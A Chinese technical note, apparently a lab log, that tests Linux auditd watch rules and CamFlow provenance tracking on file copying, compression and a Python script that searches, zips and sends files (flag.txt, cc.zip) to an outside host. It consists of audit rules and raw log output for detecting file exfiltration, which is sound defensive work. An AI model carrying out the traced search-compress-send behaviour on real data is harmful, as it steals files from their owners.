/home/supervampire/桌面/C/b.txt -p rwxa -F key=czip 压缩命令：./minizip bb.zip b.txt 查看日志：sudo ausearch -i -k czip1234type&#x3D;PROCTITLE msg&#x3D;audit(2021年02月02日 10:20:14.528:323) : proctitle&#x3D;.&#x2F;minizip b.zip b.txt type&#x3D;PATH msg&#x3D;audit(2021年02月02日 10:20:14.528:323) : item&#x3D;0 name&#x3D;b.txt inode&#x3D;394641 dev&#x3D;08:05 mode&#x3D;file,664 ouid&#x3D;supervampire ogid&#x3D;supervampire rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 type&#x3D;CWD msg&#x3D;audit(2021年02月02日 10:20:14.528:323) : cwd&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面&#x2F;C type&#x3D;SYSCALL msg&#x3D;audit(2021年02月02日 10:20:14.528:323) : arch&#x3D;x86_64 syscall&#x3D;openat success&#x3D;yes exit&#x3D;4 a0&#x3D;0xffffff9c a1&#x3D;0x7fff48d0821b a2&#x3D;O_RDONLY a3&#x3D;0x0 items&#x3D;1 ppid&#x3D;3983 pid&#x3D;4300 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;pts0 ses&#x3D;3 comm&#x3D;minizip exe&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面&#x2F;C&#x2F;minizip subj&#x3D;unconfined key&#x3D;czip Python拷贝： 添加规则：sudo auditctl -w /home/supervampire/桌面/C/c.txt -p rwxa -F key=pcopy 拷贝命令：python copy.py 查看日志：sudo ausearch -i -k pcopy1234type&#x3D;PROCTITLE msg&#x3D;audit(2021年02月02日 10:40:48.226:563) : proctitle&#x3D;python copy.py type&#x3D;PATH msg&#x3D;audit(2021年02月02日 10:40:48.226:563) : item&#x3D;0 name&#x3D;c.txt inode&#x3D;394656 dev&#x3D;08:05 mode&#x3D;file,664 ouid&#x3D;supervampire ogid&#x3D;supervampire rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 type&#x3D;CWD msg&#x3D;audit(2021年02月02日 10:40:48.226:563) : cwd&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面&#x2F;C type&#x3D;SYSCALL msg&#x3D;audit(2021年02月02日 10:40:48.226:563) : arch&#x3D;x86_64 syscall&#x3D;openat success&#x3D;yes exit&#x3D;3 a0&#x3D;0xffffff9c a1&#x3D;0x7f79a78244a0 a2&#x3D;O_RDONLY|O_CLOEXEC a3&#x3D;0x0 items&#x3D;1 ppid&#x3D;3983 pid&#x3D;4634 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;pts0 ses&#x3D;3 comm&#x3D;python exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;python3.8 subj&#x3D;unconfined key&#x3D;pcopy *压缩：** 添加规则：sudo auditctl -w /home/supervampire/桌面/C/d.txt -p rwxa -F key=pzip 拷贝命令：python zlib.py 查看日志：sudo ausearch -i -k pzip1234type&#x3D;PROCTITLE msg&#x3D;audit(2021年02月02日 10:45:35.582:619) : proctitle&#x3D;python zlib.py type&#x3D;PATH msg&#x3D;audit(2021年02月02日 10:45:35.582:619) : item&#x3D;0 name&#x3D;.&#x2F;d.txt inode&#x3D;394944 dev&#x3D;08:05 mode&#x3D;file,664 ouid&#x3D;supervampire ogid&#x3D;supervampire rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 type&#x3D;CWD msg&#x3D;audit(2021年02月02日 10:45:35.582:619) : cwd&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面&#x2F;C type&#x3D;SYSCALL msg&#x3D;audit(2021年02月02日 10:45:35.582:619) : arch&#x3D;x86_64 syscall&#x3D;openat success&#x3D;yes exit&#x3D;4 a0&#x3D;0xffffff9c a1&#x3D;0x7f156444db30 a2&#x3D;O_RDONLY|O_CLOEXEC a3&#x3D;0x0 items&#x3D;1 ppid&#x3D;3983 pid&#x3D;4715 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;pts0 ses&#x3D;3 comm&#x3D;python exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;python3.8 subj&#x3D;unconfined key&#x3D;pzip 命令行拷贝： 添加规则：sudo auditctl -w /home/supervampire/桌面/C/e.txt -p rwxa -F key=tcopy 拷贝命令：cp e.txt ee.txt 查看日志：sudo ausearch -i -k tcopy1234type&#x3D;PROCTITLE msg&#x3D;audit(2021年02月02日 10:50:53.861:679) : proctitle&#x3D;cp e.txt ee.txt type&#x3D;PATH msg&#x3D;audit(2021年02月02日 10:50:53.861:679) : item&#x3D;0 name&#x3D;e.txt inode&#x3D;396347 dev&#x3D;08:05 mode&#x3D;file,664 ouid&#x3D;supervampire ogid&#x3D;supervampire rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 type&#x3D;CWD msg&#x3D;audit(2021年02月02日 10:50:53.861:679) : cwd&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面&#x2F;C type&#x3D;SYSCALL msg&#x3D;audit(2021年02月02日 10:50:53.861:679) : arch&#x3D;x86_64 syscall&#x3D;openat success&#x3D;yes exit&#x3D;3 a0&#x3D;0xffffff9c a1&#x3D;0x7ffe0a41f210 a2&#x3D;O_RDONLY a3&#x3D;0x0 items&#x3D;1 ppid&#x3D;3983 pid&#x3D;4801 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;pts0 ses&#x3D;3 comm&#x3D;cp exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;cp subj&#x3D;unconfined key&#x3D;tcopy *压缩：** 添加规则：sudo auditctl -w /home/supervampire/桌面/C/f.txt -p rwxa -F key=tzip 压缩命令：zip f.zip f.txt 查看日志：sudo ausearch -i -k tzip12345type&#x3D;PROCTITLE msg&#x3D;audit(2021年02月02日 10:52:23.556:717) : proctitle&#x3D;zip f.zip f.txt type&#x3D;PATH msg&#x3D;audit(2021年02月02日 10:52:23.556:717) : item&#x3D;0 name&#x3D;f.txt inode&#x3D;396348 dev&#x3D;08:05 mode&#x3D;file,664 ouid&#x3D;supervampire ogid&#x3D;supervampire rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 type&#x3D;CWD msg&#x3D;audit(2021年02月02日 10:52:23.556:717) : cwd&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面&#x2F;C type&#x3D;SYSCALL msg&#x3D;audit(2021年02月02日 10:52:23.556:717) : arch&#x3D;x86_64 syscall&#x3D;openat success&#x3D;yes exit&#x3D;4 a0&#x3D;0xffffff9c a1&#x3D;0x55e411b10720 a2&#x3D;O_RDONLY a3&#x3D;0x0 items&#x3D;1 ppid&#x3D;3983 pid&#x3D;4861 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;pts0 ses&#x3D;3 comm&#x3D;zip exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;zip subj&#x3D;unconfined key&#x3D;tzip 图形界面拷贝： 添加规则：sudo auditctl -w /home/supervampire/桌面/C/g.txt -p rwxa -F key=gcopy 查看日志：sudo ausearch -i -k gcopy123456789101112131415type&#x3D;PROCTITLE msg&#x3D;audit(2021年02月02日 10:59:09.454:862) : proctitle&#x3D;&#x2F;usr&#x2F;bin&#x2F;nautilus --gapplication-service type&#x3D;PATH msg&#x3D;audit(2021年02月02日 10:59:09.454:862) : item&#x3D;0 name&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面&#x2F;C&#x2F;g.txt inode&#x3D;394598 dev&#x3D;08:05 mode&#x3D;file,664 ouid&#x3D;supervampire ogid&#x3D;supervampire rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 type&#x3D;CWD msg&#x3D;audit(2021年02月02日 10:59:09.454:862) : cwd&#x3D;&#x2F;home&#x2F;supervampire type&#x3D;SYSCALL msg&#x3D;audit(2021年02月02日 10:59:09.454:862) : arch&#x3D;x86_64 syscall&#x3D;openat success&#x3D;yes exit&#x3D;30 a0&#x3D;0xffffff9c a1&#x3D;0x5617b38c29c0 a2&#x3D;O_RDONLY a3&#x3D;0x0 items&#x3D;1 ppid&#x3D;1873 pid&#x3D;3183 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;(none) ses&#x3D;3 comm&#x3D;pool-org.gnome. exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;nautilus subj&#x3D;unconfined key&#x3D;gcopy ----type&#x3D;PROCTITLE msg&#x3D;audit(2021年02月02日 10:59:09.454:863) : proctitle&#x3D;&#x2F;usr&#x2F;bin&#x2F;nautilus --gapplication-service type&#x3D;PATH msg&#x3D;audit(2021年02月02日 10:59:09.454:863) : item&#x3D;0 name&#x3D;(null) inode&#x3D;394598 dev&#x3D;08:05 mode&#x3D;file,664 ouid&#x3D;supervampire ogid&#x3D;supervampire rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 type&#x3D;SYSCALL msg&#x3D;audit(2021年02月02日 10:59:09.454:863) : arch&#x3D;x86_64 syscall&#x3D;flistxattr success&#x3D;yes exit&#x3D;0 a0&#x3D;0x1e a1&#x3D;0x0 a2&#x3D;0x0 a3&#x3D;0x7f42e0002440 items&#x3D;1 ppid&#x3D;1873 pid&#x3D;3183 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;(none) ses&#x3D;3 comm&#x3D;pool-org.gnome. exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;nautilus subj&#x3D;unconfined key&#x3D;gcopy ----type&#x3D;PROCTITLE msg&#x3D;audit(2021年02月02日 10:59:10.826:865) : proctitle&#x3D;&#x2F;usr&#x2F;bin&#x2F;vmtoolsd -n vmusr --blockFd 3 type&#x3D;PATH msg&#x3D;audit(2021年02月02日 10:59:10.826:865) : item&#x3D;0 name&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面&#x2F;C&#x2F;g.txt inode&#x3D;394598 dev&#x3D;08:05 mode&#x3D;file,664 ouid&#x3D;supervampire ogid&#x3D;supervampire rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 type&#x3D;CWD msg&#x3D;audit(2021年02月02日 10:59:10.826:865) : cwd&#x3D;&#x2F;home&#x2F;supervampire type&#x3D;SYSCALL msg&#x3D;audit(2021年02月02日 10:59:10.826:865) : arch&#x3D;x86_64 syscall&#x3D;openat success&#x3D;yes exit&#x3D;7 a0&#x3D;0xffffff9c a1&#x3D;0x556fb49c0500 a2&#x3D;O_RDONLY a3&#x3D;0x0 items&#x3D;1 ppid&#x3D;1873 pid&#x3D;2675 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;(none) ses&#x3D;3 comm&#x3D;vmtoolsd exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;vmtoolsd subj&#x3D;unconfined key&#x3D;gcopy#其中nautilus nautilus是GNOME桌面下的文件管理工具，vmtoolsd是VMWare Tools的服务 *压缩：** 添加规则：sudo auditctl -w /home/supervampire/桌面/C/h.txt -p rwxa -F key=gzip 查看日志：sudo ausearch -i -k gzip123456789type&#x3D;PROCTITLE msg&#x3D;audit(2021年02月02日 11:02:22.947:905) : proctitle&#x3D;&#x2F;usr&#x2F;bin&#x2F;nautilus --gapplication-service type&#x3D;PATH msg&#x3D;audit(2021年02月02日 11:02:22.947:905) : item&#x3D;0 name&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面&#x2F;C&#x2F;h.txt inode&#x3D;394616 dev&#x3D;08:05 mode&#x3D;file,664 ouid&#x3D;supervampire ogid&#x3D;supervampire rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 type&#x3D;CWD msg&#x3D;audit(2021年02月02日 11:02:22.947:905) : cwd&#x3D;&#x2F;home&#x2F;supervampire type&#x3D;SYSCALL msg&#x3D;audit(2021年02月02日 11:02:22.947:905) : arch&#x3D;x86_64 syscall&#x3D;llistxattr success&#x3D;yes exit&#x3D;0 a0&#x3D;0x5617b4151ac0 a1&#x3D;0x0 a2&#x3D;0x0 a3&#x3D;0x5617b3737f10 items&#x3D;1 ppid&#x3D;1873 pid&#x3D;3183 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;(none) ses&#x3D;3 comm&#x3D;pool-org.gnome. exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;nautilus subj&#x3D;unconfined key&#x3D;gzip ----type&#x3D;PROCTITLE msg&#x3D;audit(2021年02月02日 11:02:22.951:907) : proctitle&#x3D;&#x2F;usr&#x2F;bin&#x2F;nautilus --gapplication-service type&#x3D;PATH msg&#x3D;audit(2021年02月02日 11:02:22.951:907) : item&#x3D;0 name&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面&#x2F;C&#x2F;h.txt inode&#x3D;394616 dev&#x3D;08:05 mode&#x3D;file,664 ouid&#x3D;supervampire ogid&#x3D;supervampire rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 type&#x3D;CWD msg&#x3D;audit(2021年02月02日 11:02:22.951:907) : cwd&#x3D;&#x2F;home&#x2F;supervampire type&#x3D;SYSCALL msg&#x3D;audit(2021年02月02日 11:02:22.951:907) : arch&#x3D;x86_64 syscall&#x3D;openat success&#x3D;yes exit&#x3D;31 a0&#x3D;0xffffff9c a1&#x3D;0x5617b4151ac0 a2&#x3D;O_RDONLY a3&#x3D;0x0 items&#x3D;1 ppid&#x3D;1873 pid&#x3D;3183 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;(none) ses&#x3D;3 comm&#x3D;pool-org.gnome. exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;nautilus subj&#x3D;unconfined key&#x3D;gzip Camflow测试 测试目标：进程(搜索，压缩，发送) 测试环境：Python脚本 测试脚本源码地址链接 添加规则：sudo camflow --track-process 2311 true 查看日志：cat /tmp/audit.log(由于日志太长，只截取其中一段的关键部分，该段包含关键文件名和packet信息，全部日志链接访问)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406&#123; &quot;entity&quot;: &#123; &quot;cf:ACAAAAAAACCALgIAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;142976&quot;, &quot;prov:type&quot;: &quot;socket&quot;, &quot;cf:boot_id&quot;: 40, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:version&quot;: 0, &quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;, &quot;cf:taint&quot;: &quot;0&quot;, &quot;cf:jiffies&quot;: &quot;4294963341&quot;, &quot;cf:epoch&quot;: 2, &quot;cf:uid&quot;: 0, &quot;cf:gid&quot;: 0, &quot;cf:mode&quot;: &quot;0xc1ff&quot;, &quot;cf:secctx&quot;: &quot;system_u:object_r:unlabeled_t:s0&quot;, &quot;cf:ino&quot;: 56422, &quot;cf:uuid&quot;: &quot;00000000-0000-0000-0000-000000000000&quot;, &quot;prov:label&quot;: &quot;[socket] 0&quot; &#125;, &quot;cf:AAACAAAAACAVIQAAwKi3gi9dKpaxXAAWBgAAAGi29KA&#x3D;&quot;: &#123; &quot;cf:id&quot;: 8469, &quot;cf:seq&quot;: 2700392040, &quot;cf:sender&quot;: &quot;192.168.183.130:45404&quot;, &quot;cf:receiver&quot;: &quot;47.93.42.150:22&quot;, &quot;prov:type&quot;: &quot;packet&quot;, &quot;cf:taint&quot;: &quot;0&quot;, &quot;cf:jiffies&quot;: &quot;4294963341&quot;, &quot;cf:len&quot;: 15360, &quot;prov:label&quot;: &quot;[packet] 192.168.183.130:45404-&gt;47.93.42.150:22 (8469)&quot; &#125;, &quot;cf:AAAIAAAAACA8JgIAAAAAACgAAACkyYgGFQAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;140860&quot;, &quot;prov:type&quot;: &quot;process_memory&quot;, &quot;cf:boot_id&quot;: 40, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:version&quot;: 21, &quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;, &quot;cf:taint&quot;: &quot;0&quot;, &quot;cf:jiffies&quot;: &quot;4294963379&quot;, &quot;cf:epoch&quot;: 2, &quot;cf:uid&quot;: 1000, &quot;cf:gid&quot;: 1000, &quot;cf:tgid&quot;: 2341, &quot;cf:utsns&quot;: 4026531838, &quot;cf:ipcns&quot;: 4026531839, &quot;cf:mntns&quot;: 4026531840, &quot;cf:pidns&quot;: 4026531836, &quot;cf:netns&quot;: 4026531992, &quot;cf:cgroupns&quot;: 4026531835, &quot;cf:secctx&quot;: &quot;unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023&quot;, &quot;prov:label&quot;: &quot;[process] 21&quot; &#125;, &quot;cf:AAEAAAAAACBDxgAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;50755&quot;, &quot;prov:type&quot;: &quot;file&quot;, &quot;cf:boot_id&quot;: 40, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:version&quot;: 0, &quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;, &quot;cf:taint&quot;: &quot;0&quot;, &quot;cf:jiffies&quot;: &quot;4294963462&quot;, &quot;cf:epoch&quot;: 2, &quot;cf:uid&quot;: 0, &quot;cf:gid&quot;: 0, &quot;cf:mode&quot;: &quot;0x81a4&quot;, &quot;cf:secctx&quot;: &quot;unconfined_u:object_r:ld_so_cache_t:s0&quot;, &quot;cf:ino&quot;: 322674, &quot;cf:uuid&quot;: &quot;90365732-09d3-477e-bf09-6e627d11b666&quot;, &quot;prov:label&quot;: &quot;[file] 0&quot; &#125;, &quot;cf:AABAAAAAACThul9E+DhrUCgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;5794787984492444385&quot;, &quot;prov:type&quot;: &quot;path&quot;, &quot;cf:boot_id&quot;: 40, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:version&quot;: 0, &quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;, &quot;cf:taint&quot;: &quot;0&quot;, &quot;cf:jiffies&quot;: &quot;4294963336&quot;, &quot;cf:epoch&quot;: 2, &quot;cf:pathname&quot;: &quot;&#x2F;usr&#x2F;bin&#x2F;python3.9&quot;, &quot;prov:label&quot;: &quot;[path] &#x2F;usr&#x2F;bin&#x2F;python3.9&quot; &#125;, &quot;cf:AABAAAAAACQLciqz2yQUOygAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;4257068073794302475&quot;, &quot;prov:type&quot;: &quot;path&quot;, &quot;cf:boot_id&quot;: 40, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:version&quot;: 0, &quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;, &quot;cf:taint&quot;: &quot;0&quot;, &quot;cf:jiffies&quot;: &quot;4294963336&quot;, &quot;cf:epoch&quot;: 2, &quot;cf:pathname&quot;: &quot;&#x2F;home&#x2F;supervampire&#x2F;Camflow-test&#x2F;flag.txt&quot;, &quot;prov:label&quot;: &quot;[path] &#x2F;home&#x2F;supervampire&#x2F;Camflow-test&#x2F;flag.txt&quot; &#125;, &quot;cf:AABAAAAAACTUxo1ZkB2e5ygAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;16689809774896596692&quot;, &quot;prov:type&quot;: &quot;path&quot;, &quot;cf:boot_id&quot;: 40, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:version&quot;: 0, &quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;, &quot;cf:taint&quot;: &quot;0&quot;, &quot;cf:jiffies&quot;: &quot;4294963336&quot;, &quot;cf:epoch&quot;: 2, &quot;cf:pathname&quot;: &quot;&#x2F;home&#x2F;supervampire&#x2F;Camflow-test&#x2F;c.txt&quot;, &quot;prov:label&quot;: &quot;[path] &#x2F;home&#x2F;supervampire&#x2F;Camflow-test&#x2F;c.txt&quot; &#125;, &quot;cf:AABAAAAAACRjBXZwWD6wUCgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;5814215668500137315&quot;, &quot;prov:type&quot;: &quot;path&quot;, &quot;cf:boot_id&quot;: 40, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:version&quot;: 0, &quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;, &quot;cf:taint&quot;: &quot;0&quot;, &quot;cf:jiffies&quot;: &quot;4294963336&quot;, &quot;cf:epoch&quot;: 2, &quot;cf:pathname&quot;: &quot;&#x2F;home&#x2F;supervampire&#x2F;Camflow-test&#x2F;camflow.py&quot;, &quot;prov:label&quot;: &quot;[path] &#x2F;home&#x2F;supervampire&#x2F;Camflow-test&#x2F;camflow.py&quot; &#125;, &quot;cf:AABAAAAAACQKWd+Om89h2ygAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;15808144434071034122&quot;, &quot;prov:type&quot;: &quot;path&quot;, &quot;cf:boot_id&quot;: 40, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:version&quot;: 0, &quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;, &quot;cf:taint&quot;: &quot;0&quot;, &quot;cf:jiffies&quot;: &quot;4294963336&quot;, &quot;cf:epoch&quot;: 2, &quot;cf:pathname&quot;: &quot;&#x2F;home&#x2F;supervampire&#x2F;Camflow-test&#x2F;cc.zip&quot;, &quot;prov:label&quot;: &quot;[path] &#x2F;home&#x2F;supervampire&#x2F;Camflow-test&#x2F;cc.zip&quot; &#125;, &quot;cf:AABAAAAAACQijbO7AsObRygAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;5159932214589492514&quot;, &quot;prov:type&quot;: &quot;path&quot;, &quot;cf:boot_id&quot;: 40, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:version&quot;: 0, &quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;, &quot;cf:taint&quot;: &quot;0&quot;, &quot;cf:jiffies&quot;: &quot;4294963336&quot;, &quot;cf:epoch&quot;: 2, &quot;cf:pathname&quot;: &quot;&#x2F;home&#x2F;supervampire&#x2F;Camflow-test&#x2F;A&#x2F;a.txt&quot;, &quot;prov:label&quot;: &quot;[path] &#x2F;home&#x2F;supervampire&#x2F;Camflow-test&#x2F;A&#x2F;a.txt&quot; &#125;, &quot;cf:AABAAAAAACSjpcW7AsObRygAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;5159932214590678435&quot;, &quot;prov:type&quot;: &quot;path&quot;, &quot;cf:boot_id&quot;: 40, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:version&quot;: 0, &quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;, &quot;cf:taint&quot;: &quot;0&quot;, &quot;cf:jiffies&quot;: &quot;4294963336&quot;, &quot;cf:epoch&quot;: 2, &quot;cf:pathname&quot;: &quot;&#x2F;home&#x2F;supervampire&#x2F;Camflow-test&#x2F;A&#x2F;b.txt&quot;, &quot;prov:label&quot;: &quot;[path] &#x2F;home&#x2F;supervampire&#x2F;Camflow-test&#x2F;A&#x2F;b.txt&quot; &#125;, &quot;cf:AABAAAAAACSH6fP&#x2F;+sAVIigAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;2456081356069005703&quot;, &quot;prov:type&quot;: &quot;path&quot;, &quot;cf:boot_id&quot;: 40, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:version&quot;: 0, &quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;, &quot;cf:taint&quot;: &quot;0&quot;, &quot;cf:jiffies&quot;: &quot;4294963338&quot;, &quot;cf:epoch&quot;: 2, &quot;cf:pathname&quot;: &quot;&#x2F;root&#x2F;usr&#x2F;lib64&#x2F;python3.9&#x2F;encodings&#x2F;idna.py&quot;, &quot;prov:label&quot;: &quot;[path] &#x2F;root&#x2F;usr&#x2F;lib64&#x2F;python3.9&#x2F;encodings&#x2F;idna.py&quot; &#125;, &quot;cf:AABAAAAAACRe0ES5WgG5ASgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;124131953896378462&quot;, &quot;prov:type&quot;: &quot;path&quot;, &quot;cf:boot_id&quot;: 40, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:version&quot;: 0, &quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;, &quot;cf:taint&quot;: &quot;0&quot;, &quot;cf:jiffies&quot;: &quot;4294963338&quot;, &quot;cf:epoch&quot;: 2, &quot;cf:pathname&quot;: &quot;&#x2F;root&#x2F;usr&#x2F;lib64&#x2F;python3.9&#x2F;encodings&#x2F;__pycache__&#x2F;idna.cpython-39.pyc&quot;, &quot;prov:label&quot;: &quot;[path] &#x2F;root&#x2F;usr&#x2F;lib64&#x2F;python3.9&#x2F;encodings&#x2F;__pycache__&#x2F;idna.cpython-39.pyc&quot; &#125; &#125;, &quot;used&quot;: &#123; &quot;cf:BAAAAAAAIIDsAAAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;236&quot;, &quot;prov:type&quot;: &quot;memory_read&quot;, &quot;cf:boot_id&quot;: 40, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;, &quot;cf:jiffies&quot;: &quot;4294963341&quot;, &quot;cf:epoch&quot;: 2, &quot;prov:label&quot;: &quot;memory_read&quot;, &quot;cf:allowed&quot;: &quot;true&quot;, &quot;prov:entity&quot;: &quot;cf:AAAIAAAAACA8JgIAAAAAACgAAACkyYgGFAAAAAAAAAA&#x3D;&quot;, &quot;prov:activity&quot;: &quot;cf:AQAAAAAAAEA7JgIAAAAAACgAAACkyYgGIAAAAAAAAAA&#x3D;&quot;, &quot;cf:flags&quot;: &quot;0&quot;, &quot;cf:task_id&quot;: &quot;140859&quot; &#125;, &quot;cf:AgAAAAAAIID1AAAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: 